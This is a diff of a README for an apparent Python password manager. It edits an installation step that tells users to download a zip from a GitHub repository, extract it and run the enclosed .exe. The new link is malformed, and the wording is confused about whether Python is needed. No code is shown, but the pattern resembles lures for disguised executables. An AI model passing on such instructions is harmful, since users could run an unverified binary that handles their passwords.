@@ -22,4 +22,4 @@ A robust, Python-based password manager designed with privacy and security as it
 
 ## **Installation**
 
-install the [Download v1.0.0](https://github.com/rohanjha0ae-glitch/svtest/releases/download/v1.0.0/_internal.zip)    file and extract everthing in one place you will see and exe file there simply run it if you have python installed on your device.
+install the [Download v1.0.0]([https://github.com/rohanjha0ae-glitch/svtest/blob/main/_internal.zip])    file and extract everthing in one place you will see and exe file there simply run it if you have python installed on your device.
